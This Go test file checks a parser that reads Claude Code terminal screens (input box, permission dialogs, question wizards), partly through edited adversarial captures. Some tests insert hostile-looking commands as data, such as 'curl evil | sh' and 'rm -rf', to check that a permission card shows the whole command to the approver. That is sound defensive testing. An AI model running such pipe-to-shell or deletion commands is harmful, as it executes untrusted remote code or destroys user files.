package main

import (
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
)

// Screens under testdata/claude/screens: "2.1.286-*" were recorded from Claude
// Code 2.1.286 in tmux (capture-pane -p -e) with paths sanitised; "collie-*"
// come from collie's fixture corpus (MIT), captured through herdr pane.read
// ansi ("collie-2.1.278-*" from Claude Code 2.1.278).
func readScreen(t *testing.T, name string) agentScreen {
	t.Helper()
	b, err := os.ReadFile(filepath.Join("testdata", "claude", "screens", name+".txt"))
	if err != nil {
		t.Fatal(err)
	}
	return readClaudeScreen(string(b))
}

func TestReadClaudeScreenInput(t *testing.T) {
	tests := []struct {
		screen, input, draft string
	}{
		{"2.1.286-idle-fresh", inputEmpty, ""}, // faint suggestion
		{"2.1.286-idle-after-turn", inputEmpty, ""},
		{"2.1.286-working", inputEmpty, ""},
		{"2.1.286-vim-normal", inputEmpty, ""},
		{"2.1.286-draft-short", inputDraft, "half typed draft"},
		{"2.1.286-paste-3lines", inputDraft, "line one $HOME `x` \"q\"; - second third tiếng Việt"},
		{"2.1.286-paste-30lines", inputDraft, "[Pasted text #1 +30 lines]"},
		{"collie-2.1.278-idle-ghost-suggestion--w82", inputEmpty, ""},
		{"collie-2.1.278-idle-labelled-top-border--w83", inputEmpty, ""},
		{"collie-2.1.278-statusline-rule-row--w82", inputEmpty, ""},
		{"collie-2.1.278-statusline-prompt-row--w82", inputEmpty, ""},
		{"collie-2.1.278-transcript-dialog-lookalike--w82", inputEmpty, ""},
		{"collie-2.1.278-working-queued-message--w82", inputEmpty, ""},
		{"collie-2.1.278-mode-bash--w82", inputDraft, "!ls -1 src | head -3"},
		// The popup is taller than the statusline allowance: not ready either way.
		{"collie-2.1.278-popup-slash-all--w82", inputNone, ""},
		{"collie-2.1.278-draft-long-wrapped--w40", inputDraft, "please read the README file and the notes under docs, then tell me in three short bullet points what this lab project contains, without changing any file at all"},
		// Dialogs and menus have no input box.
		{"2.1.286-permission-bash", inputNone, ""},
		{"2.1.286-ask-single", inputNone, ""},
		{"2.1.286-ask-wizard-submit", inputNone, ""},
		// "Submit answers" and "Chat about this" go back to the input box.
		{"2.1.286-ask-wizard-after-submit", inputEmpty, ""},
		{"2.1.286-ask-wizard-submit-esc", inputEmpty, ""},
		{"2.1.286-ask-chat-after", inputEmpty, ""},
		{"2.1.286-trust-unnumbered", inputNone, ""},
		{"collie-2.1.278-menu-model-picker--w82", inputNone, ""},
		{"collie-2.1.278-plan-approval--w82", inputNone, ""},
	}
	for _, tt := range tests {
		t.Run(tt.screen, func(t *testing.T) {
			sc := readScreen(t, tt.screen)
			if sc.input != tt.input || sc.draft != tt.draft {
				t.Errorf("input=%q draft=%q, want %q %q", sc.input, sc.draft, tt.input, tt.draft)
			}
		})
	}
}

func labels(p *AgentPrompt) string {
	var out []string
	for _, o := range p.Options {
		out = append(out, strings.Join([]string{itoaInt(o.Index), o.Label}, ". "))
	}
	return strings.Join(out, " | ")
}

func itoaInt(n int) string { return string(rune('0' + n)) }

func TestReadClaudeScreenDialogs(t *testing.T) {
	tests := []struct {
		screen, kind, title, options string
		bodyHas                      string
	}{
		{"2.1.286-permission-bash", "permission", "Bash command",
			"1. Yes | 2. Yes, and always allow access to /tmp/lab | 3. No", "touch scratch-one.txt"},
		{"2.1.286-permission-write", "permission", "Create file", "1. Yes | 2. Yes, and switch to accept edits (auto-approve file edits and common file commands) for this | 3. No", "Do you want to create hello.txt?"},
		{"collie-claude--permission-edit", "permission", "Create file", "1. Yes | 2. Yes, allow all edits during this session (shift+tab) | 3. No", "1 hello"},
		// "Type something" needs the terminal; "Chat about this" is one key.
		{"2.1.286-ask-single", "select", "Theme", "1. Red | 2. Green | 3. Blue | 5. Chat about this", "Which color theme do you prefer?"},
		// 47 columns: the footer wraps onto two rows.
		{"2.1.286-ask-single-narrow", "select", "Color", "1. Red | 2. Blue | 4. Chat about this", "Which color do you prefer?"},
		{"collie-claude--select-menu", "select", "Color Theme", "1. Red | 2. Green | 3. Blue | 5. Chat about this", "Which color theme should the dashboard use?"},
		// A wizard, one tab at a time: the question is the title.
		{"2.1.286-ask-wizard", "select", "What size do you want?", "1. Small | 2. Large | 4. Chat about this", ""},
		{"2.1.286-ask-wizard-tab2", "select", "Which drink do you prefer?", "1. Tea | 2. Coffee | 4. Chat about this", ""},
		// Back on an answered tab, the earlier pick is marked.
		{"2.1.286-ask-wizard-back", "select", "What size would you like?", "1. Small | 2. Large ✔ | 4. Chat about this", ""},
		// The Submit tab, drawn without a footer.
		{"2.1.286-ask-wizard-submit", "select", "Review your answers", "1. Submit answers | 2. Cancel", "→ Coffee"},
		// Options with previews: the preview on the right of each option row
		// is not part of it; "Chat about this" there has no number.
		{"2.1.286-ask-preview", "select", "Layout", "1. Stacked | 2. Row", "Which button layout suits a phone prompt card?"},
		{"2.1.286-ask-preview-pointer-2", "select", "Layout", "1. Stacked | 2. Row", ""},
		{"2.1.286-ask-wizard-preview", "select", "Which button layout suits your card?", "1. Stacked | 2. Row", ""},
		{"2.1.286-ask-wizard-preview-next", "select", "Which theme do you prefer?", "1. Light | 2. Dark | 4. Chat about this", ""},
		// "⚠ You have not answered all questions" is part of the review.
		{"2.1.286-ask-wizard-submit-partial", "select", "Review your answers", "1. Submit answers | 2. Cancel", "You have not answered all questions"},
		// multiSelect: each digit toggles one option; "Type something" needs the terminal.
		{"2.1.286-ask-multi", "multiselect", "Which toppings do you want?", "1. Cheese | 2. Ham | 3. Olives | 5. Chat about this", ""},
		{"2.1.286-ask-wizard-multi-tab", "multiselect", "What extras would you like?", "1. Sugar | 2. Milk | 4. Chat about this", ""},
		{"2.1.286-ask-wizard-multi-open", "multiselect", "Which extras would you like?", "1. Sugar | 2. Milk | 4. Chat about this", ""},
		{"2.1.286-ask-wizard-multi-toggled", "multiselect", "Which extras would you like?", "1. Sugar | 2. Milk | 4. Chat about this", ""},
		// The pointer on the free-text option: a digit would be typed into it.
		{"2.1.286-ask-wizard-multi-cursor-free-text", "unsupported", "Which extras would you like?", "", ""},
		{"2.1.286-ask-wizard-multi-typed", "unsupported", "Which extras would you like?", "", ""},
		{"collie-claude--wizard-multiselect-q1", "multiselect", "Which toppings would you like on your pizza?", "1. Pepperoni | 2. Mushrooms | 3. Bell peppers | 4. Extra cheese | 6. Chat about this", ""},
		{"2.1.286-trust-unnumbered", "unsupported", "Accessing workspace:", "", "Quick safety check"},
	}
	for _, tt := range tests {
		t.Run(tt.screen, func(t *testing.T) {
			sc := readScreen(t, tt.screen)
			p := sc.prompt
			if p == nil || sc.sig == "" {
				t.Fatalf("no dialog: %+v", sc)
			}
			if p.Kind != tt.kind || (tt.title != "" && p.Title != tt.title) || labels(p) != tt.options || !strings.Contains(p.Body, tt.bodyHas) {
				t.Errorf("got kind=%q title=%q options=%q body=%q", p.Kind, p.Title, labels(p), p.Body)
			}
		})
	}
	// The tab row becomes the steps, the tab open marked.
	steps := func(p *AgentPrompt) string {
		var out []string
		for _, s := range p.Steps {
			mark := "☐"
			if s.Answered {
				mark = "☒"
			}
			if s.Current {
				mark = "[" + mark + "]"
			}
			out = append(out, mark+s.Label)
		}
		return strings.Join(out, " ")
	}
	for name, want := range map[string]string{
		"2.1.286-ask-wizard":                   "[☐]Size ☐Drink ☐Submit",
		"2.1.286-ask-wizard-tab2":              "☒Size [☐]Drink ☐Submit",
		"2.1.286-ask-wizard-back":              "[☒]Size ☐Drink ☐Submit",
		"2.1.286-ask-wizard-submit":            "☒Size ☒Drink [☐]Submit",
		"2.1.286-ask-wizard-multi-tab":         "☒Size ☒Drink [☐]Extras ☐Submit",
		"collie-claude--wizard-multiselect-q1": "[☐]Toppings ☐Crust ☐Submit",
		"2.1.286-ask-wizard-mixed":             "[☐]Size ☐Extras ☐Drink ☐Submit",
		"2.1.286-ask-wizard-after-multi":       "☐Size ☒Extras [☐]Drink ☐Submit",
		// Leaving a multiSelect tab with nothing ticked does not answer it.
		"2.1.286-ask-wizard-skip-multi": "☐Size ☐Extras [☐]Drink ☐Submit",
		"2.1.286-ask-single":            "",
	} {
		if got := steps(readScreen(t, name).prompt); got != want {
			t.Errorf("%s steps = %q, want %q", name, got, want)
		}
	}
	// A question with previews is answered with the pointer, then Enter.
	for name, pointer := range map[string]int{"2.1.286-ask-preview": 1, "2.1.286-ask-preview-pointer-2": 2, "2.1.286-ask-wizard-preview-pointer-2": 2} {
		p := readScreen(t, name).prompt
		if !p.moveThenEnter || p.pointer != pointer || p.Options[0].Detail != "" || p.Options[1].Detail != "" {
			t.Errorf("%s: moveThenEnter=%v pointer=%d options=%+v", name, p.moveThenEnter, p.pointer, p.Options)
		}
	}
	if p := readScreen(t, "2.1.286-ask-single").prompt; p.moveThenEnter {
		t.Error("a question without previews is answered with its digit")
	}
	// An option described as "Notes: …" is not a preview.
	notes := strings.Replace(fixtureText(t, "2.1.286-ask-single"), "A calm, natural color theme", "Notes: a calm theme", 1)
	if p := readClaudeScreen(notes).prompt; p == nil || p.moveThenEnter || labels(p) != "1. Red | 2. Green | 3. Blue | 5. Chat about this" || p.Options[1].Detail != "Notes: a calm theme" {
		t.Errorf("Notes in a description = %+v", p)
	}
	// A wide character takes two columns but one rune: the label is cut at
	// the preview box, not at a column.
	if p := readClaudeScreen(strings.Replace(fixtureText(t, "2.1.286-ask-preview"), "153m Stacked", "153m 縦並び", 1)).prompt; p == nil || labels(p) != "1. 縦並び | 2. Row" {
		t.Errorf("wide label = %+v", p)
	}
	// A preview the footer does not announce is left to the terminal.
	quiet := strings.Replace(fixtureText(t, "2.1.286-ask-preview"), "n to add notes · ", "", 1)
	if quiet == fixtureText(t, "2.1.286-ask-preview") {
		t.Fatal("footer edit did not apply")
	}
	if p := readClaudeScreen(quiet).prompt; p == nil || p.Kind != "unsupported" {
		t.Errorf("unannounced preview = %+v", p)
	}
	// Moving the pointer shows another preview: another screen.
	if readScreen(t, "2.1.286-ask-preview").sig == readScreen(t, "2.1.286-ask-preview-pointer-2").sig {
		t.Error("previews of two options have the same signature")
	}
	// A ticked option is checked, without its box in the label.
	checked := func(name string) string {
		var out []string
		for _, o := range readScreen(t, name).prompt.Options {
			if o.Checked {
				out = append(out, o.Label)
			}
		}
		return strings.Join(out, ",")
	}
	if got := checked("2.1.286-ask-wizard-multi-open"); got != "" {
		t.Errorf("untouched multiSelect checked = %q", got)
	}
	if got := checked("2.1.286-ask-wizard-multi-toggled"); got != "Milk" {
		t.Errorf("toggled multiSelect checked = %q", got)
	}
	if p := readScreen(t, "2.1.286-ask-wizard-multi-toggled").prompt; p.Options[0].Detail != "Add sugar" {
		t.Errorf("multiSelect detail = %q", p.Options[0].Detail)
	}
	// An option's description rows become its detail.
	p := readScreen(t, "2.1.286-ask-single").prompt
	if p.Options[0].Detail != "A warm, energetic color theme" {
		t.Errorf("detail = %q", p.Options[0].Detail)
	}
	if p := readScreen(t, "2.1.286-permission-bash").prompt; !strings.Contains(p.Options[1].Detail, "from this project") && !strings.Contains(p.Options[1].Label, "from this project") {
		t.Errorf("wrapped option lost: %+v", p.Options[1])
	}
}

func TestReadClaudeScreenUnknownIsNotADialog(t *testing.T) {
	// A menu whose footer has no "Esc to cancel", a dialog that ends on a
	// path row: neither is answered, and neither has an input box.
	for _, name := range []string{"collie-2.1.278-menu-model-picker--w82", "collie-2.1.278-plan-approval--w82", "collie-2.1.278-permission-webfetch--w82"} {
		sc := readScreen(t, name)
		if sc.input != inputNone || (sc.prompt != nil && sc.prompt.Kind != "unsupported") {
			t.Errorf("%s: input=%q prompt=%+v", name, sc.input, sc.prompt)
		}
	}
	for _, s := range []string{"", "\n\n", "plain shell $ ls\n", "Esc to cancel"} {
		if sc := readClaudeScreen(s); sc.input != inputNone || sc.prompt != nil {
			t.Errorf("%q = %+v", s, sc)
		}
	}
}

func TestDialogSignature(t *testing.T) {
	b, _ := os.ReadFile("testdata/claude/screens/2.1.286-permission-bash.txt")
	a := readClaudeScreen(string(b))
	// The pointer moving is the same dialog.
	moved := strings.Replace(string(b), "❯", " ", 1)
	moved = strings.Replace(moved, "  2. Yes", "❯ 2. Yes", 1)
	if readClaudeScreen(moved).sig != a.sig {
		t.Error("pointer move changed the signature")
	}
	other := strings.Replace(string(b), "touch scratch-one.txt", "rm -rf ~/scratch.txt", -1)
	if readClaudeScreen(other).sig == a.sig {
		t.Error("another command has the same signature")
	}
}

func TestDialogSignatureHasTheOpenTab(t *testing.T) {
	// Two tabs that read the same are told apart by the tab open.
	rule := strings.Repeat("─", 40)
	tab := func(row string) string {
		return rule + "\n" + row + "\nPick one?\n❯ 1. A\n  2. B\nEnter to select · Tab/Arrow keys to navigate · Esc to cancel\n"
	}
	on := "\x1b[48;5;153m"
	off := "\x1b[49m"
	a := readClaudeScreen(tab("←  " + on + "☐ Q" + off + "  ☐ Q  ✔ Submit  →"))
	b := readClaudeScreen(tab("←  ☐ Q  " + on + "☐ Q" + off + "  ✔ Submit  →"))
	if a.prompt == nil || a.prompt.Kind != "select" || b.prompt == nil || a.sig == b.sig {
		t.Errorf("a=%+v b=%+v", a.prompt, b.prompt)
	}
	// Without a tab drawn open the tab to answer is unknown.
	if p := readClaudeScreen(tab("←  ☐ Q  ☐ Q  ✔ Submit  →")).prompt; p == nil || p.Kind != "unsupported" {
		t.Errorf("no open tab = %+v", p)
	}
	// A tab row cut or wrapped by a narrow pane is not read.
	if p := readClaudeScreen(tab("←  ☒ Size  ☐ Milk\n" + on + "☐ Q" + off + "  ✔ Submit  →")).prompt; p == nil || p.Kind != "unsupported" {
		t.Errorf("wrapped tab row = %+v", p)
	}
	if p := readClaudeScreen(tab("←  " + on + "☐ Q" + off + "  ☐ Q  ✔ Sub")).prompt; p != nil && p.Kind != "unsupported" {
		t.Errorf("cut tab row = %+v", p)
	}
	// Text typed into the free-text option replaces "Type something"; with
	// the pointer moved off it, it is an option of the tab, ticked, that its
	// digit toggles.
	typed := fixtureText(t, "2.1.286-ask-wizard-multi-typed")
	typedAway := strings.Replace(strings.Replace(typed, "\x1b[38;5;153m❯\x1b[39m \x1b[38;5;246m3.", "  \x1b[38;5;246m3.", 1), "  \x1b[38;5;246m1.", "❯ \x1b[38;5;246m1.", 1)
	if typedAway == typed {
		t.Fatal("pointer move did not apply")
	}
	if p := readClaudeScreen(typedAway).prompt; p == nil || p.Kind != "multiselect" || labels(p) != "1. Sugar | 2. Milk | 3. 2 | 4. Chat about this" || !p.Options[2].Checked || p.FreeText != nil {
		t.Errorf("typed text, pointer away = %+v", p)
	}
	// A single-choice option that starts with a box is not a multiSelect.
	if p := readClaudeScreen(tab("←  " + on + "☐ Q" + off + "  ✔ Submit  →")).prompt; p == nil || p.Kind != "select" {
		t.Errorf("plain tab = %+v", p)
	}
	boxed := readClaudeScreen(rule + "\n←  " + on + "☐ Q" + off + "  ✔ Submit  →\nDone?\n❯ 1. [x] Done\n  2. Not yet\n  3. Type something.\nEnter to select · Esc to cancel\n").prompt
	if boxed == nil || boxed.Kind != "select" {
		t.Errorf("one boxed label = %+v", boxed)
	}
	// multiSelect without its tab row is not answered.
	if p := readClaudeScreen(rule + "\n☐ Q\nPick some?\n❯ 1. [ ] A\n  2. [ ] B\nEnter to select · Esc to cancel\n").prompt; p == nil || p.Kind != "unsupported" {
		t.Errorf("multiSelect without tabs = %+v", p)
	}
	// Two tabs drawn open is not a screen to answer either.
	if p := readClaudeScreen(tab("←  " + on + "☐ Q  ☐ Q" + off + "  ✔ Submit  →")).prompt; p == nil || p.Kind != "unsupported" {
		t.Errorf("two open tabs = %+v", p)
	}
}

func TestSubmitTabLookalikes(t *testing.T) {
	b, err := os.ReadFile(filepath.Join("testdata", "claude", "screens", "2.1.286-ask-wizard-submit.txt"))
	if err != nil {
		t.Fatal(err)
	}
	submit := string(b)
	if sc := readClaudeScreen(submit); sc.prompt == nil || sc.sig == "" {
		t.Fatalf("fixture not read: %+v", sc)
	}
	tests := map[string]string{
		// A row of another kind below the options: not at the bottom.
		"row below the options": submit + "\n  some output\n",
		// The tab row with a question tab open: a question tab has a footer.
		"question tab open": strings.Replace(submit, "\x1b[38;5;16m\x1b[48;5;153m ✔ Submit", " ✔ Submit", 1),
		// No rule above the tab row.
		"no top edge": strings.Replace(submit, "────", "    ", -1),
		// A rule between the tab row and the options.
		"rule inside": strings.Replace(submit, "Ready to submit your answers?", strings.Repeat("─", 40), 1),
		// A row that only looks like the tab row: a message drawn on a
		// background, Submit its only "tab".
		"one-step row": strings.Repeat("─", 40) + "\n\x1b[48;5;237m❯ please ✔ Submit →\x1b[49m\nReview\n1. Yes\n2. No\n",
		"Submit alone": strings.Repeat("─", 40) + "\n←  \x1b[48;5;153m✔ Submit\x1b[49m  →\nReview\n1. Yes\n2. No\n",
		// Options above prose above options.
		"options in the body": strings.Replace(submit, "Review your answers", "1. Review your answers", 1),
	}
	for name, s := range tests {
		if s == submit {
			t.Fatalf("%s: fixture edit did not apply", name)
		}
		if sc := readClaudeScreen(s); sc.prompt != nil {
			t.Errorf("%s = %+v", name, sc.prompt)
		}
	}
	// A numbered list at the bottom of plain output is not a dialog.
	if sc := readClaudeScreen("Steps:\n1. build\n2. test\n"); sc.prompt != nil {
		t.Errorf("plain list = %+v", sc.prompt)
	}
	// Options numbered from elsewhere are not answered.
	renumbered := strings.Replace(strings.Replace(submit, "1. \x1b[38;5;153mSubmit", "3. \x1b[38;5;153mSubmit", 1), "2. \x1b[39mCancel", "4. \x1b[39mCancel", 1)
	if renumbered == submit {
		t.Fatal("renumbering did not apply")
	}
	if sc := readClaudeScreen(renumbered); sc.prompt != nil {
		t.Errorf("renumbered = %+v", sc.prompt)
	}
}

func TestParseScreenBackground(t *testing.T) {
	lines := parseScreen("a \x1b[48;5;153mB\x1b[49m c \x1b[48;2;1;2;3mD\x1b[0m e \x1b[7mF\x1b[27m g \x1b[41mH\x1b[m i\n")
	if lines[0].hl != "  B   D   F   H" {
		t.Errorf("hl = %q", lines[0].hl)
	}
	// The colon form keeps its arguments in one field.
	if l := parseScreen("a \x1b[48:5:153mB\x1b[49m \x1b[38:2::1:2:3mc\x1b[0m \x1b[48:2::1:2:3mD\x1b[m \x1b[48:me\n"); l[0].hl != "  B   D" {
		t.Errorf("colon hl = %q", l[0].hl)
	}
	// 38;5;48 is a foreground colour whose index happens to be 48.
	if l := parseScreen("x \x1b[38;5;48my\x1b[39m\n"); strings.TrimSpace(l[0].hl) != "" {
		t.Errorf("foreground counted as background: %q", l[0].hl)
	}
}

func fixtureText(t *testing.T, name string) string {
	t.Helper()
	b, err := os.ReadFile(filepath.Join("testdata", "claude", "screens", name+".txt"))
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

func TestParseScreenFaint(t *testing.T) {
	lines := parseScreen("❯ \x1b[2mTry this\x1b[0m\r\nplain \x1b[38;5;2mgreen\x1b[0m\n\x1b]0;title\x07x\n\n")
	if len(lines) != 3 {
		t.Fatalf("lines = %+v", lines)
	}
	if lines[0].text != "❯ Try this" || strings.TrimSpace(strings.TrimPrefix(lines[0].solid, "❯ ")) != "" {
		t.Errorf("faint row = %q / %q", lines[0].text, lines[0].solid)
	}
	// 22 ends faint without a full reset.
	if l := parseScreen("\x1b[2mfa\x1b[22mok\n"); l[0].solid != "  ok" {
		t.Errorf("after 22 solid = %q", l[0].solid)
	}
	// 38;5;2 is a colour, not SGR 2.
	if lines[1].solid != "plain green" {
		t.Errorf("colour row solid = %q", lines[1].solid)
	}
	if lines[2].text != "x" {
		t.Errorf("OSC row = %q", lines[2].text)
	}
}

func TestDraftShows(t *testing.T) {
	tests := []struct {
		draft, text string
		want        bool
	}{
		{"line one - second", "line one\n- second", true},
		{"[Pasted text #1 +30 lines]", strings.Repeat("row\n", 30), true},
		{"[Pasted text #3 +19 lines]", strings.Repeat("r\n", 19) + "r", true},
		{"[Pasted text #3 +19 lines]", strings.Repeat("r\n", 5), false},
		{"[Pasted text #2]", strings.Repeat("x", 1200), true},
		{"[Pasted text #2]", "a\nb", false},
		{"other text", "my text", false},
		{"", "", false},
		{"my tex", "my text", false},
	}
	for _, tt := range tests {
		if got := draftShows(tt.draft, tt.text); got != tt.want {
			t.Errorf("draftShows(%q, %q) = %v", tt.draft, tt.text, got)
		}
	}
}

// Screens that must not read as an empty input box or as an answerable
// dialog, built by editing recorded ones.
func TestReadClaudeScreenAdversarial(t *testing.T) {
	read := func(name string) string {
		b, err := os.ReadFile(filepath.Join("testdata", "claude", "screens", name+".txt"))
		if err != nil {
			t.Fatal(err)
		}
		return string(b)
	}
	perm := read("2.1.286-permission-bash")
	rule := strings.Repeat("─", 40)
	box := func(row string) string { return rule + "\n" + row + "\n" + rule + "\n  status\n" }

	t.Run("draft holding a dialog footer", func(t *testing.T) {
		sc := readClaudeScreen("● hi\n" + box("❯ please type Esc to cancel"))
		if sc.input != inputDraft || sc.prompt != nil {
			t.Errorf("%+v", sc)
		}
	})
	t.Run("dialog text above a live empty box", func(t *testing.T) {
		sc := readClaudeScreen(" Do you want to proceed?\n ❯ 1. Yes\n   2. No\n Esc to cancel\n" + box("❯ "))
		if sc.input != inputEmpty || sc.prompt != nil {
			t.Errorf("%+v", sc)
		}
	})
	t.Run("half faint, half typed", func(t *testing.T) {
		sc := readClaudeScreen(box("❯ \x1b[2mTry this\x1b[0m and more"))
		if sc.input != inputDraft {
			t.Errorf("%+v", sc)
		}
	})
	t.Run("dialog scrolled up, output below", func(t *testing.T) {
		sc := readClaudeScreen(perm + "\n$ echo later\nlater\n")
		if sc.prompt != nil || sc.input != inputNone {
			t.Errorf("%+v", sc)
		}
	})
	t.Run("numbering not from 1", func(t *testing.T) {
		var plain []string
		for _, l := range parseScreen(perm) {
			plain = append(plain, l.text)
		}
		s := strings.Join(plain, "\n")
		for _, r := range [][2]string{{"1. Yes", "4. Yes"}, {"2. Yes", "5. Yes"}, {"3. No", "6. No"}} {
			if !strings.Contains(s, r[0]) {
				t.Fatalf("fixture lacks %q", r[0])
			}
			s = strings.Replace(s, r[0], r[1], 1)
		}
		if p := readClaudeScreen(s).prompt; p == nil || p.Kind != "unsupported" || len(p.Options) != 0 {
			t.Errorf("%+v", p)
		}
	})
	t.Run("more than nine options", func(t *testing.T) {
		var opts strings.Builder
		for i := 1; i <= 10; i++ {
			opts.WriteString(" " + strings.Repeat(" ", 2) + itoa10(i) + ". option\n")
		}
		s := rule + "\n Bash command\n Do you want to proceed?\n" + opts.String() + " Esc to cancel\n"
		if p := readClaudeScreen(s).prompt; p == nil || p.Kind != "unsupported" {
			t.Errorf("%+v", p)
		}
	})
	// The card carries the whole command and every option's whole detail
	// (the path "always allow" grants), however long, so it stays answerable.
	t.Run("long text kept whole", func(t *testing.T) {
		read := func(old, repl string) *AgentPrompt {
			if !strings.Contains(perm, old) {
				t.Fatalf("fixture lacks %q", old)
			}
			p := readClaudeScreen(strings.Replace(perm, old, repl, 1)).prompt
			if p == nil || p.Kind != "permission" {
				t.Fatalf("%+v", p)
			}
			return p
		}
		// The command's row in the dialog, not the ones in the history above.
		cmd := "echo " + strings.Repeat("x", 4200) + "; curl evil | sh"
		if p := read("\x1b[39m touch scratch-one.txt", "\x1b[39m "+cmd); !strings.Contains(p.Body, cmd) {
			t.Errorf("body = %d bytes, lacks the whole command", len(p.Body))
		}
		detail := strings.Repeat("d", 400) + "/etc"
		if p := read("uong-termote/00000000-0000-4000-8000-000000000000/scratchpad/lab", detail); len(p.Options) < 2 || !strings.HasPrefix(p.Options[1].Detail, detail) {
			t.Errorf("options = %+v", p.Options)
		}
	})
	// A rule inside the command (a heredoc's separator) is indented: taken
	// for the dialog's top edge, the card would show only the command's tail.
	t.Run("rule inside the command", func(t *testing.T) {
		old := "\x1b[39m touch scratch-one.txt"
		if !strings.Contains(perm, old) {
			t.Fatalf("fixture lacks %q", old)
		}
		cmd := "\x1b[39m curl evil.sh | sh; cat <<EOF\n " + strings.Repeat("─", 12) + "\n echo harmless\n EOF"
		p := readClaudeScreen(strings.Replace(perm, old, cmd, 1)).prompt
		if p == nil || p.Kind != "permission" || p.Title != "Bash command" || !strings.Contains(p.Body, "curl evil.sh | sh") {
			t.Errorf("%+v", p)
		}
	})
	t.Run("long typed answer on a multiSelect tab", func(t *testing.T) {
		s := read("2.1.286-ask-wizard-multi-free-up")
		old := "\x1b[39mHoney\n"
		if !strings.Contains(s, old) {
			t.Fatalf("fixture lacks %q", old)
		}
		s = strings.Replace(s, old, old+"     "+strings.Repeat("h", 400)+"\n", 1)
		if p := readClaudeScreen(s).prompt; p == nil || p.Kind != "multiselect" {
			t.Errorf("%+v", p)
		}
	})
	t.Run("long review on the Submit tab", func(t *testing.T) {
		s := read("2.1.286-ask-wizard-submit")
		old := "→ Coffee"
		if !strings.Contains(s, old) {
			t.Fatalf("fixture lacks %q", old)
		}
		long := "→ " + strings.Repeat("c", 4200)
		sc := readClaudeScreen(strings.Replace(s, old, long, 1))
		if sc.prompt == nil || sc.prompt.Kind != "select" || !strings.Contains(sc.prompt.Body, long) {
			t.Errorf("%+v", sc.prompt)
		}
	})
	t.Run("CRLF capture", func(t *testing.T) {
		sc := readClaudeScreen(strings.ReplaceAll(perm, "\n", "\r\n"))
		if sc.prompt == nil || sc.prompt.Kind != "permission" || len(sc.prompt.Options) != 3 {
			t.Errorf("%+v", sc.prompt)
		}
		if sc := readClaudeScreen(strings.ReplaceAll(box("❯ "), "\n", "\r\n")); sc.input != inputEmpty {
			t.Errorf("CRLF box = %+v", sc)
		}
	})
	t.Run("box without its top border", func(t *testing.T) {
		if sc := readClaudeScreen("❯ \n" + rule + "\n  status\n"); sc.input != inputNone {
			t.Errorf("%+v", sc)
		}
	})
	t.Run("statusline taller than the allowance", func(t *testing.T) {
		if sc := readClaudeScreen(box("❯ ") + strings.Repeat("  status row\n", 12)); sc.input != inputNone {
			t.Errorf("%+v", sc)
		}
	})
}

func itoa10(n int) string { return strconv.Itoa(n) }

func TestWrappedFooterIsOnlyTheHintsTail(t *testing.T) {
	b, _ := os.ReadFile("testdata/claude/screens/2.1.286-permission-bash.txt")
	perm := string(b)
	// A whole footer with another row below it is not a dialog at the
	// bottom: the extra row (a spinner, a toast) would change the signature
	// on every read.
	if sc := readClaudeScreen(perm + "\n  some other row\n"); sc.prompt != nil {
		t.Errorf("footer above a stray row = %+v", sc.prompt)
	}
	// Prose cut as "… Esc to" / "cancel" under a rule, nothing numbered.
	rule := strings.Repeat("─", 40)
	if sc := readClaudeScreen(rule + "\n Notes\n Press Esc to\n cancel\n"); sc.prompt != nil && sc.prompt.Kind != "unsupported" {
		t.Errorf("prose = %+v", sc.prompt)
	}
	// A real wrap of the select footer keeps its signature as the pointer moves.
	n, _ := os.ReadFile("testdata/claude/screens/2.1.286-ask-single-narrow.txt")
	var plain []string
	for _, l := range parseScreen(string(n)) {
		plain = append(plain, l.text)
	}
	screen := strings.Join(plain, "\n")
	moved := strings.Replace(strings.Replace(screen, "❯ 1. Red", "  1. Red", 1), "  2. Blue", "❯ 2. Blue", 1)
	a := readClaudeScreen(screen)
	if moved == screen || a.prompt == nil || readClaudeScreen(moved).sig != a.sig {
		t.Errorf("narrow signature moved with the pointer (changed=%v)", moved != screen)
	}
	// "… Esc" / "to cancel" is a wrap too.
	if sc := readClaudeScreen(rule + "\n Bash command\n Do you want to proceed?\n ❯ 1. Yes\n   2. No\n Enter to confirm · Esc\n to cancel\n"); sc.prompt == nil || sc.prompt.Kind != "permission" {
		t.Errorf("wrap after Esc = %+v", sc.prompt)
	}
}

func TestFreeTextOption(t *testing.T) {
	tests := []struct {
		screen, kind, options string
		freeText              int // FreeText.Index, 0 when not offered
		free                  freeField
		pointer               int
	}{
		// Empty, the pointer elsewhere: offered.
		{"2.1.286-ask-single", "select", "1. Red | 2. Green | 3. Blue | 5. Chat about this", 4, freeField{4, "Type something.", true, false}, 1},
		{"2.1.286-ask-wizard-tab2", "select", "1. Tea | 2. Coffee | 4. Chat about this", 3, freeField{3, "Type something.", true, false}, 1},
		{"2.1.286-ask-wizard-free-after-enter", "select", "1. Tea | 2. Coffee | 4. Chat about this", 3, freeField{3, "Type something.", true, false}, 1},
		{"2.1.286-ask-wizard-multi-open", "multiselect", "1. Sugar | 2. Milk | 4. Chat about this", 3, freeField{3, "Type something", true, false}, 1},
		{"2.1.286-ask-multi", "multiselect", "1. Cheese | 2. Ham | 3. Olives | 5. Chat about this", 4, freeField{4, "Type something", true, false}, 1},
		// Ticked by its digit, still the placeholder.
		{"2.1.286-ask-wizard-multi-free-digit", "multiselect", "1. Sugar | 2. Milk | 4. Chat about this", 3, freeField{3, "Type something", true, true}, 1},
		// The pointer on it: the card is read-only, the field still read.
		{"2.1.286-ask-free-pointer", "unsupported", "", 0, freeField{4, "Type something.", true, false}, 4},
		{"2.1.286-ask-free-typed", "unsupported", "", 0, freeField{4, "Purple please", false, false}, 4},
		{"2.1.286-ask-free-typed-vi", "unsupported", "", 0, freeField{4, "Tím nhạt", false, false}, 4},
		{"2.1.286-ask-free-wrapped", "unsupported", "", 0, freeField{4, "Purple — tím nhạt, or maybe a soft lavender with a hint of grey so that the contrast stays readable at night on a phone", false, false}, 4},
		{"2.1.286-ask-wizard-free-pointer", "unsupported", "", 0, freeField{3, "Type something.", true, false}, 3},
		{"2.1.286-ask-wizard-free-typed", "unsupported", "", 0, freeField{3, "Medium", false, false}, 3},
		{"2.1.286-ask-wizard-multi-free-pointer", "unsupported", "", 0, freeField{3, "Type something", true, false}, 3},
		{"2.1.286-ask-wizard-multi-free-typed", "unsupported", "", 0, freeField{3, "Honey", false, true}, 3},
		// Holding text, the pointer away: single-choice drops it (its digit
		// moves the pointer into the text), multiSelect toggles it.
		{"2.1.286-ask-wizard-free-back", "select", "1. Small | 2. Large | 4. Chat about this", 0, freeField{3, "Medium ✔", false, false}, 1},
